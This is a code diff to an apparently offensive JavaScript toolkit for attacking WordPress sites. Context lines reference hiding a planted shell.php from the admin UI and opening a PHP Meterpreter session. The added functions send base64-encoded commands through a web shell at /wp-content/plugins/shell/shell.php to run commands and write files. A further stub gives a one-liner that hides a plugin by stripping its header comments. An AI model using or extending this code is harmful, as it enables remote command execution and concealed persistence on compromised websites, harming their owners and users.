@@ -347,7 +347,6 @@ async function hideYertleShell()
 			await sleep(5000);
 			continue;
 		}
-
 	}
 
 	console.log("About to overwrite the shell.php to hide it in the UI...");
@@ -356,6 +355,7 @@ async function hideYertleShell()
 	xhr.open("GET", uri, true);
 	xhr.send(null);
 }
+
 
 
 
@@ -438,8 +438,69 @@ function openPhpMeterpreterSession()
 	
 	xhr.open("GET", uri, true);
 	xhr.send(null);
-
 }
+
+
+// handy
+function runCmd()
+{
+	console.log("Starting runCmd...");
+
+	var cmd = "touch testFile.txt";
+
+	var payload = btoa(cmd);
+
+    var uri = "/wp-content/plugins/shell/shell.php?cmd=" + payload;
+
+    // Ok, let's send our command
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+}
+
+
+
+// This is promising...
+function writeFile()
+{
+	var fileContent = `This
+	is Some
+	multiline
+	file content`;
+
+	console.log("Starting write file..");
+
+	var encodedFileContent = btoa(fileContent);
+	var cmd = "echo " + encodedFileContent + " | base64 --decode > testFile2.txt";
+
+	var payload = btoa(cmd);
+
+    var uri = "/wp-content/plugins/shell/shell.php?cmd=" + payload;
+
+    // Ok, let's send our command
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+
+
+	console.log("Done write file..");
+}
+
+
+
+function hidePlugin(pluginPath)
+{
+	// Ok, you can hide an arbitrary plugin by simply
+	// dropping the first comments in it, and 
+	// rewriting the file
+	// Here's a linux one liner:
+	// tail --lines=+`grep -n "*/" user-role-editor.php | head -n 1 | awk -F: '{print $1+1}'`  user-role-editor.php
+	// you can cat that back
+}
+
+
 
 
 
@@ -480,3 +541,7 @@ function openPhpMeterpreterSession()
 
 // Someday this is going to work....
 //openPhpMeterpreterSession();
+
+
+//runCmd();
+//writeFile();
